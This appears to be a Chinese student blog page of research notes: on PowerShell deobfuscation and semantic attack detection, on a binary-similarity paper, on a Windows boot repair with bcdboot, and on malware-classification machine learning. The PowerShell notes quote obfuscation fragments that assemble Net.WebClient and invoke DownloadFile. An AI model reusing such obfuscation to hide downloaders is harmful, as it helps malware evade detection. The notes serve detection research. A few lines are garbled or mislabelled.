+<p>这方面的混淆只影响阅读，而对文件语法语义没有影响</p>
+<h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><p>这主要是在执行时通过字符串的一些操作得到字符串</p>
+<p>如：</p>
+<blockquote>
+<p>$StrReorder = “{1}{0}{2}”-f ‘w-o’,’Ne’,’ject’</p>
+<p>$Strjoint = “Net.W” + “ebClient”</p>
+<p>$Url = “{9}…{26}”-f’ellE’…’s1’</p>
+</blockquote>
+<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>这是实际应用最常见的混淆方式，编码后的代码只能反映很少一部分原本代码的信息</p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2>
+
+<h3 id="Deobfuscation-phase"><a href="#Deobfuscation-phase" class="headerlink" title="Deobfuscation phase"></a>Deobfuscation phase</h3><p>这一过程中使用到了基于子树的方法来利用powershell的特征</p>
+<p>将AST的子树作为混淆的最小单位，对这些子树施行复原最终构建去混淆的脚本，去混淆的脚本之后会用在训练和检测中</p>
+<h3 id="Training-and-detection-phase"><a href="#Training-and-detection-phase" class="headerlink" title="Training and detection phase"></a>Training and detection phase</h3><p>反混淆之后，PowerShell脚本中的语义会被暴露出来并可以以此设计实现语义上的攻击检测系统。采用经典的Objective-oriented Association mining algorithm在数据集上，自动提取OOA rules用于特征匹配</p>
+<h3 id="Application-scenarios"><a href="#Application-scenarios" class="headerlink" title="Application scenarios"></a>Application scenarios</h3><p>文中的方法主要还是基于静态分析，因此相比较于动态分析具有更高的代码覆盖率，更低的开销，并且不需要对系统或解释器进行修改。</p>
+<p>相比于现存的静态分析方案，文中的方案对混淆更具有适应力，更可解释</p>
+<p>文中系统可以应用的场景有：</p>
+<ul>
+<li>实时</li>
+<li>大尺度自动化恶意代码检测</li>
+</ul>
+<h2 id="PowerShell-Deobfuscation"><a href="#PowerShell-Deobfuscation" class="headerlink" title="PowerShell Deobfuscation"></a>PowerShell Deobfuscation</h2><p>基于静态而非动态的原因：</p>
+<ul>
+<li>动态方法需要对系统或解释器进行额外修改</li>
+<li>动态方法已知的具有更低的代码覆盖度</li>
+</ul>
+<p>混淆后的脚本必须能生产出背后隐藏的原脚本，这样解释器才能够正确的执行</p>
+<p>脚本片段主要可以分成两部分，hidden original pieces和recovery algorithms</p>
+<p>更重要的一个特点是这些片段会返回字符串类型的恢复后的代码片段，因此称前面的那些片段为recoverable pieces，后面的为recovered pieces</p>
+<p>recoverable pieces在AST中相关的子树为recoverable subtress</p>
+<p>只要能找到这些片段，就可以直接用嵌入的恢复算法恢复出原本的代码片段</p>
+<p>然而在实际应用中，recoverable和脚本的其他部分并没有明显的界限尤其是代码呗多次混淆的情况下。为了解决这一问题论文中提出了基于AST子树定位可恢复代码片段，并重建原代码的方法</p>
+<h3 id="Subtree-based-Deobfuscation-Approach-Overview"><a href="#Subtree-based-Deobfuscation-Approach-Overview" class="headerlink" title="Subtree-based Deobfuscation Approach Overview"></a>Subtree-based Deobfuscation Approach Overview</h3>
+
+<p>总体上来说分五步骤</p>
+<ol>
+<li>将Powershell脚本解释为AST，提取子树</li>
+<li>使用分类器找到被混淆了的片段子树，但并不是所有满足分类器的子树都可还原的</li>
+<li>使用一个模拟器来恢复原本的代码片段</li>
+<li>反混淆的片段被解释为语法树，并替换原本的子树</li>
+<li>重构整个语法树得到原本的完整代码片段</li>
+</ol>
+<p>在整个过程结束后还需要进行处理去除混淆添加的多余结构</p>
+<p>在第二步中，recoverable pieces可能是混淆片段的一部分，这种情况下如果直接尝试恢复片段，得到的结果只是一个中间过程；反过来，混淆的片段也可能只是recoverable pieces的一部分，这种情况下与第一种情况类似，直接尝试恢复也无法得到原片段。</p>
+<p>文中用栈自底向上遍历所有可以节点，这可以避免恢复级别过高的节点。为了避免恢复的level过低，需要对输出结果进行模拟，如果输出结果不是字符串就意味着这棵子树不是recoverable的，之后就需要继续遍历以达到一个更高的level</p>
+<h3 id="Extract-Suspicious-Subtrees"><a href="#Extract-Suspicious-Subtrees" class="headerlink" title="Extract Suspicious Subtrees"></a>Extract Suspicious Subtrees</h3><p>文中的系统使用了微软的API<code>System.Management.Automation.Language</code>，用来提取PowerShell的语法树。</p>
+<p>PowerShell的语法树一共有71种节点，调用的api会返回一个语法树和一个<code>ScriptBlockAst</code>类型的根节点。一个典型的几KB大小的脚本会有几千个语法树结点，这意味着会有几千个子树，检测全部的子树会耗费很多时间</p>
+<p>向上级节点传递节点片段只有两种方式，直接通过管道或是间接通过变量传递，因此我们只需要检测这两种类型的子树</p>
+<ul>
+<li>PipelineAst类型的子树节点</li>
+<li>AssignmentStatementAst节点的第二个子树</li>
+</ul>
+<p>这两种类型的子树为可疑的子树，下图红色为Pipeline类型蓝色为AssignmentStatementAst类型</p>
+
+
+
+
+<p>这样可以显著的减少需要检测的类型</p>
+<p>基于这种思想，将AST以广度优先搜索，并将可以节点按照顺序压栈待处理</p>
+<h3 id="Subtree-based-Obfuscation-Detection"><a href="#Subtree-based-Obfuscation-Detection" class="headerlink" title="Subtree-based Obfuscation Detection"></a>Subtree-based Obfuscation Detection</h3><p>上一步得到的可疑子树在这里输入一个二分类的分类器进行判别，即使混淆可以很好的隐藏语义信息，语法树中仍会有一些特征残留。现有的对Javascript和PowerShell的混淆检测正确率很高，因此直接使用现有的方法进行应用。</p>
+<p>分成以下步骤：</p>
+<h4 id="特征选择"><a href="#特征选择" class="headerlink" title="特征选择"></a>特征选择</h4><p>文中参照了</p>
+<blockquote>
+<p>DanielBohannon.2019. PowerShell Obfuscation Detection Framework. Contribute to danielbohannon/Revoke-Obfuscation development by creating an account on GitHub. <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Revoke-Obfuscation">https://github.com/danielbohannon/Revoke-Obfuscation</a> original-date: 2017-07-11T01:20:48Z</p>
+<p>MehranJodavi,MahdiAbadi,andElhamParhizkar.2015. JSObfusDetector:A binaryPSO-basedone-classclassifierensembletodetectobfuscatedJavaScript code.In 2015 The International Symposium on Artificial Intelligence and Signal Processing (AISP).IEEE,Mashhad,Iran,322–327. <a target="_blank" rel="noopener" href="https://doi.org/10.1109/AISP">https://doi.org/10.1109/AISP</a>. 2015.7123508 </p>
+</blockquote>
+<p>两篇文章选择了四种特征</p>
+<ul>
+<li>Entropy of script pieces (代码片段熵) </li>
+<li>Lengths of tokens, 取最大和最小token长度作为特征</li>
+<li>Distribution of AST types: 混淆过程中特定种类节点的数目会变化，文中将这个数量作为一个向量当作特征</li>
+<li>Depth of AST：所有的混淆的方法都对AST的深度有很大影响</li>
+</ul>
+<p>上面四种总计76种特征(?)</p>
+<p>实现时文中使用了梯度下降的逻辑回归作为分类器</p>
+<p>计算代码片段熵的公式：</p>
+<p>$$H = - \sum{P_ilog_2^{P_i}}$$</p>
+<p>其中$P_i$代表第i个字符的出现频率</p>
+<h3 id="Emulation-based-Recovery"><a href="#Emulation-based-Recovery" class="headerlink" title="Emulation-based Recovery"></a>Emulation-based Recovery</h3><p>这一步中建立了一个powershell的session，并最终给执行这些混淆的代码片段，如果是一个recoverable的代码片段，最终过程的返回值是一个字符串类型，如果不是字符串则说明检测结果错误或者当前片段不是一个recoverable的片段，检测中无论碰到哪种情况都对这个子树进行标记并继续查找下一个子树。</p>
+<p>由于遍历顺序是自底向上的，总会有一个高层次的子树是recoverable的且包含了当前这个子树。</p>
+<h3 id="AST-Update"><a href="#AST-Update" class="headerlink" title="AST Update"></a>AST Update</h3><p>上一步结束后需要将AST中的混淆部分进行替换，这里主要有两个步骤，首先替换recoveable subtrees为recovered subtrees；另外就是代码片段中改变的部分也需要更新。</p>
+<p>实现时存储需要更新的子树根节点，从下向上传递。</p>
+<h3 id="POST-processing"><a href="#POST-processing" class="headerlink" title="POST processing"></a>POST processing</h3> 
+
+<p>在重新构建代码后，我们可以得到一个和原本代码具有相同语义的代码，但是语法上两者仍有差别，这些差异主要由混淆过程导致。</p>
+<p>混淆过程中为了方便解释器理解代码引入了token，例如<code>(&quot;DownloadFile&quot;).invoke($url)</code>中<code>invoke</code>告诉解释器<code>DownloadFile</code>应该被当作一个成员函数而<code>$url</code>是其参数</p>
+<p>同时混淆过程中还会引入一些额外的括号，因此在Post processing过程中这些语法层面上的内容会被修正</p>
+<h2 id="Sematic-Aware-Powershell-Attack-Detection"><a href="#Sematic-Aware-Powershell-Attack-Detection" class="headerlink" title="Sematic-Aware Powershell Attack Detection"></a>Sematic-Aware Powershell Attack Detection</h2><p>系统总体工作流程如下：</p>
+
+
+<p>语义分析上的攻击检测对多态变量名具有更好的效果，同时系统的鲁棒性比较好</p>
+<p>二进制程序分析中经常使用各种图、控制流图、依赖图等而不是API集合来表现语义特征，这是由于API集合只包含低层次的语义，比较容易误判</p>
+<p>然而在PowerShell中API集合具有很高层次的语义，这是由于Powershell的API可以很直接的访问系统功能，同时考虑到使用集合标识特征比图具有更好的性能，文中使用了API集合作为特征。</p>
+<p>整体的步骤可以分为training和detection两个部分</p>
+<h3 id="Training-Phase"><a href="#Training-Phase" class="headerlink" title="Training Phase"></a>Training Phase</h3><p>首先提取前面工作得到的节点并对其归一化，主要包括：</p>
+<ul>
+<li>转换为小写</li>
+<li>删除武关子夫</li>
+<li>检查别名</li>
+</ul>
+<h4 id="OOA"><a href="#OOA" class="headerlink" title="OOA"></a>OOA</h4>
+
+<p>提取OOA rules的方法需要两个步骤：首先使用FP-growth算法生成频率模式，之后选择计算符合要求的模式即分数大于设置的阈值的模式。特别的support标识恶意的可能性，而confidence标识正常的可能性</p>
+<p>$$ support(I,Obj) = \frac{count(I \cup {Obj},DB)}{|DB|}$$</p>
+<p>$$ support(I,Obj) = \frac{count(I \cup {Obj},DB)}{count(I,DB)}$$</p>
+<p>这里I表示指令的集合，函数$count(I \cup {Obj},DB)$返回在DB中$I \cup {Obj}$出现的次数</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/10/06/alphaDiff/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/06/alphaDiff/" class="post-title-link" itemprop="url">alphaDiff</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-06 03:06:11" itemprop="dateCreated datePublished" datetime="2019-10-06T03:06:11+08:00">2019-10-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Paper/" itemprop="url" rel="index"><span itemprop="name">Paper</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Cross-Version-Binary-Code-Similarity-Detection-with-DNN"><a href="#Cross-Version-Binary-Code-Similarity-Detection-with-DNN" class="headerlink" title="Cross-Version Binary Code Similarity Detection with DNN"></a>Cross-Version Binary Code Similarity Detection with DNN</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>二进制相似度检测有很多的应用，包括对patch的分析、代码抄袭的分析、恶意代码检测等，但是传统的方法是依靠专业技术人员的知识从二进制中提取特征的，这要么成本很高，要么效果很差，并且很少有能够对跨版本的文件进行分析的。（跨版本的文件不仅在句法结构syntactic上不同，语义上semantic差异也很大）</p>
+<p>文中主要是设计了一个深度学习的系统用于跨版本的二进制相似度分析，主要采用了三个特征：intra-function、inter-function、inter-module</p>
+<!--more--->
+
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>BCSD有很多应用，甚至可以通过分析打补丁前后的文件用于分析1Day漏洞以及总结漏洞模式；更进一步的，将BCSD应用在已知的BUG和目标程序上还可以实现不同架构机器上的漏洞挖掘</p>
+<p>但是这个技术也面临着一些挑战：</p>
+<ol>
+<li>同一编译器不同的优化方式得到的代码不同——cross-optimization</li>
+<li>不同编译器或使用不同算法得到的代码不同——cross-compiler</li>
+<li>同一源码在不同架构下得到的二进制不同——cross-architecture</li>
+<li>同一文件不同时期（由于patch）的二进制不同——cross-version</li>
+</ol>
+<p>现有的方法一定程度可以解决前三个问题，但cross-version的代码表现都不是很好</p>
+<p>cross-version的二进制不仅在syntactic上有所不同，在semantic上也有一些差异；</p>
+<p>主要是现有的方法大多使用了人工提取特征，这有可能会引入一些偏差，另外有些特征的例如CFG，在代码发生些微改变时可能会剧变；这些方法大多数都只关注到了syntactic层面，很少提取到semantic层面，然而在二进制分析中，相似的文件在语义，即表达的思想、实现的功能上是高度相似的，具体的二进制函数代码只是其表现形式。</p>
+<p>这篇文章主要想解决三个问题：</p>
+<ol>
+<li>如何能从二进制文件中尽可能不含偏见的提取特征</li>
+<li>如何有效的利用semantic上的特征来提高BCSD的性能</li>
+<li>如何构建一个可行的适用于cross-version文件的BCSD系统</li>
+</ol>
+<p>这个系统使用的特征都是从二进制本身提取的，没有利用到相关的需要专业知识提取的特征，首先直接使用DNN从raw bytes提取函数中的特征：将二进制比特视为矩阵输入CNN，卷积得到向量作为特征</p>
+<p>之后为了确保功能相近的函数向量距离接近，又将这个CNN用于孪生神经网络</p>
+<p>第二，相似的函数具有相似的调用图，但是反之则不成立；因此作者对每个函数的调用图进行分析提取了inter-function特征，这里只考虑了每个节点的入度和出度，并没有具体分析，这是为了更好的性能所作的取舍</p>
+<p>第三，相似的函数具有相似的导入函数，这一特点即使在不同架构也成立，同样反之不成立，分析导入函数得到特征称之为inter-module</p>
+<h2 id="Approach"><a href="#Approach" class="headerlink" title="Approach"></a>Approach</h2><p>主要是介绍了三个特征的具体得到的方式，以及最终计算相似度的标准</p>
+<h3 id="Intra-function"><a href="#Intra-function" class="headerlink" title="Intra-function"></a>Intra-function</h3><p>结构：8层convolutional，8层batch normalization，4层 max pooling，2层全连接</p>
+<p>输入：100<em>100</em>1 的张量</p>
+<p>输出：64维的向量</p>
+<p>输入的直接是10000字节的函数raw bytes，不足的部分用0填充</p>
+<p>防止过拟合的措施和AlexNet类似，使用了layer stacking和batch normalization</p>
+<p>孪生神经网络部分则是成对输入，将两个函数分别输入给两个CNN，同时还输入了一个标签决定是否是相似的，这两个网络共享参数，根据两个网络的结果计算一个损失值</p>
+<p>损失函数这里是他们自己重新定义的：</p>
+<p>$$D1(I_q,I_t)=||f(I_q;\theta)-f(I_t;\theta)||$$<br>$$L(\theata) = Average_{(I_q,I_t)}{y \dot D1(I_q,I_t)+(1-y) \dot max(0,m-D1(I_q,I_t))}$$</p>
+<p>这里的m是作为预先设置的超参数存在的</p>
+<p>孪生神经网络的主要目的是训练CNN，得到合适的参数$\theta$是的损失最小</p>
+<h3 id="Inter-function"><a href="#Inter-function" class="headerlink" title="Inter-function"></a>Inter-function</h3><p>这个特征是从CFG提取出来的，其中每个节点的入度和出度作为一个二维向量当成特征</p>
+<p>$$g(I_q) = (in(I_q),out(I_q)) $$</p>
+<p>这个特征距离的计算方法就是直接用了欧式距离</p>
+<p>$$ D2(I_q,I_t) = ||g(I_q)-g(I_t)|| $$</p>
+<h3 id="Inter-module"><a href="#Inter-module" class="headerlink" title="Inter-module"></a>Inter-module</h3><p>这部分的特征是从引入函数提取出来的</p>
+<p>首先定义一个哈希函数，能够将一个集合映射为一个向量</p>
+<p>$$ h(set,superset) = &lt;x_1,x_2,…,x_N&gt; $$</p>
+<p>这个向量作为一个特征</p>
+<p>一个二进制文件B的引入函数集合记作$imp(B)$</p>
+<p>B的某个函数I的引入函数记作$imp(I)$</p>
+<p>距离计算方法：</p>
+<p>$$ D3(I_q,I_t) = ||h(imp(I_q),imp(B_q)\cap imp(B_t)) - h(imp(I_t),imp(B_q)\cap imp(B_t))|| $$</p>
+<h3 id="Overall"><a href="#Overall" class="headerlink" title="Overall"></a>Overall</h3><p>最终两个函数之间的相似度计算公式：</p>
+<p>$$<br>D(I_q,I_t)=D1(I_q,I_t)+(1- \epsilon^{D2(I_q,I_t)})+D3(I_q,I_t)<br>$$</p>
+<p>这里的$\epsilon$也是一个超参数</p>
+<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>文章太水了，没啥说的</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/10/05/Winodws-bcdboot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/05/Winodws-bcdboot/" class="post-title-link" itemprop="url">Winodws bcdboot</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-05 19:58:04" itemprop="dateCreated datePublished" datetime="2019-10-05T19:58:04+08:00">2019-10-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="windows-的引导扇区被误删，修复方法"><a href="#windows-的引导扇区被误删，修复方法" class="headerlink" title="windows 的引导扇区被误删，修复方法"></a>windows 的引导扇区被误删，修复方法</h2><p>首先制作一个Windows的U盘启动盘，启动之后找到里面的修复计算机</p>
+<p>在修复计算机的选项里存在一个命令行参数</p>
+<p>使用diskpart找到引导扇区所在的分区，并命名</p>
+<p>同时还需要找到安装Windows的C盘所在的分区并命名</p>
+<p>之后使用bcdboot修复即可</p>
+<p>完整的cmd命令如下:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">diskpart</span><br><span class="line"></span><br><span class="line">&gt; list disk</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">select</span> disk <span class="number">0</span></span><br><span class="line"></span><br><span class="line">&gt; list part</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">select</span> part <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&gt; assign letter P:</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">select</span> disk <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&gt; list part</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">select</span> part <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&gt; assign letter C:</span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">bcdboot C:\Windows \s P: \f UEFI</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完成即可，上面的分区和硬盘是符合我自己情况的</p>
+<p>我的电脑硬盘有两个,disk0是固态，里面的2号分区是引导分区</p>
+<p>disk1是机械硬盘，windows 的C盘安装在里面的2号分区</p>
+<p>bcdboot的作用是将C盘下的Windows目录中与启动相关的文件复制到目标分区中，因此上面命令中P盘是给引导扇区的命名盘符</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/08/30/git-clone%E7%89%B9%E5%AE%9A%E7%9A%84branch/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/08/30/git-clone%E7%89%B9%E5%AE%9A%E7%9A%84branch/" class="post-title-link" itemprop="url">git clone特定的branch</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-30 16:28:59" itemprop="dateCreated datePublished" datetime="2019-08-30T16:28:59+08:00">2019-08-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>想要找一个好看的建立模板，找到github上的一个repo:<a target="_blank" rel="noopener" href="https://github.com/billryan/resume.git">https://github.com/billryan/resume.git</a></p>
+<p>但是中文的简历模板不在master的分支里而是单独的一个分支，稍查了一下用法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --single-branch --branch zh_CN https://github.com/billryan/resume.git</span><br></pre></td></tr></table></figure>
+
+<p>加上这个参数<code>--single-branch</code>，就可以clone特定的branch了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://river-li.xyz/2019/07/23/Malware-Data-Science-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="River Li">
+      <meta itemprop="description" content="WHU 网络空间安全在读">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="River's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/23/Malware-Data-Science-2/" class="post-title-link" itemprop="url">Malware-Data-Science-2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-23 19:51:42" itemprop="dateCreated datePublished" datetime="2019-07-23T19:51:42+08:00">2019-07-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Malware-Data-Science/" itemprop="url" rel="index"><span itemprop="name">Malware Data Science</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>该部分对应文章中的第六章到第八章</p>
+<p>商用反病毒引擎可能存在的缺点在于我们不清楚其中具体实现的原理</p>
+<p>在部分情况下需要对结果的比例进行调整时有一个自己构建的系统还是更加方便</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该部分对应书中内容第六章</p>
+<p>机器学习的方法和传统的算法有明显的思想上的区别</p>
+<p>传统的算法是具体的步骤和指令</p>
+<p>而机器学习是使用样本例子来给程序示范</p>
+<p>机器学习的步骤:</p>
+<ul>
+<li>收集数据</li>
+<li>提取特征</li>
+<li>训练分类器</li>
+<li>测试验证</li>
+</ul>
+<p>提取特征判断是否是恶意程序的几个点:</p>
+<ul>
+<li>是否有数字签名</li>
+<li>是否出现了恶意格式的文件头</li>
+<li>是否出现了加密的数据</li>
+<li>是否在100台以上计算机上出现</li>
+</ul>
+<p>选择合适的样本</p>
+<ul>
+<li>数量不要太多</li>
+<li>具有代表性</li>
+<li>能够代表分类</li>
+</ul>
+<p>机器学习分类的任务就是在特征空间中划分一个分界面，区分两个面中的样本</p>
+<p>这个面称为决策面</p>
+<p>最简单的两种分界方法：线性回归、K邻近</p>
+<p>评价分类效果的好坏，要看是否有过拟合和欠拟合</p>
+<h3 id="常用的算法"><a href="#常用的算法" class="headerlink" title="常用的算法"></a>常用的算法</h3><h4 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h4><p>适用于简单样本，即可以通过一条线或一个面来将样本分开</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logistic_regression</span>(<span class="params">compressed_data, supicious_calls, learned_parameters</span>):</span></span><br><span class="line">    compressed_data = compressed_data * learned_parameters[<span class="string">&quot;compressed_data_eight&quot;</span>]</span><br><span class="line">    suspicious_calls = supicious_calls * learned_parameters[<span class="string">&quot;supicious_calls_weight&quot;</span>]</span><br><span class="line">    score = compressed_data + supicious_calls + bias</span><br><span class="line">    <span class="keyword">return</span> logistic_function(score)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logistic_function</span>(<span class="params">score</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1.0</span>+math.e**(-score))</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="K-邻近算法"><a href="#K-邻近算法" class="headerlink" title="K 邻近算法"></a>K 邻近算法</h4><ul>
+<li>提取二进制特征，找到在特征空间中距离最近的k个样本</li>
+<li>计算这k个样本中恶意样本的数量，根据这个比例判定是否是恶意样本</li>
+</ul>
+<p>当样本分布不均匀但是成堆分布时可以考虑用这个方法</p>
+<h4 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h4><p>决策树算法本质上是一层一层的if判断，因此根节点的选择比较重要</p>
+<p>根节点应该是能将yes和no区分开的一个节点，最好接近50的比例</p>
+<p>决策树算法在预测未见过的样本时一般效果不太好，所以应用比较少</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tree &#x3D; Tree()</span><br><span class="line">def add_question(training_examples):</span><br><span class="line">    question &#x3D; pick_best_question(training_examples)</span><br><span class="line">    uncertainty_yes,yes_samples &#x3D; ask_question(question, training_examples, &quot;yes&quot;)</span><br><span class="line">    uncertainty_no, no_samples &#x3D; ask_question(question, training_examples, &quot;no&quot;)</span><br><span class="line">    if not uncertainty_yes &lt; MIN_UNCERTAINTY:</span><br><span class="line">        add_question(yes_samples)</span><br><span class="line">    if not uncertainty_no &lt; MIN_UNCERTAINTY:</span><br><span class="line">        add_question(no_samples)</span><br><span class="line"></span><br><span class="line">add_question(training_examples)</span><br></pre></td></tr></table></figure>
+
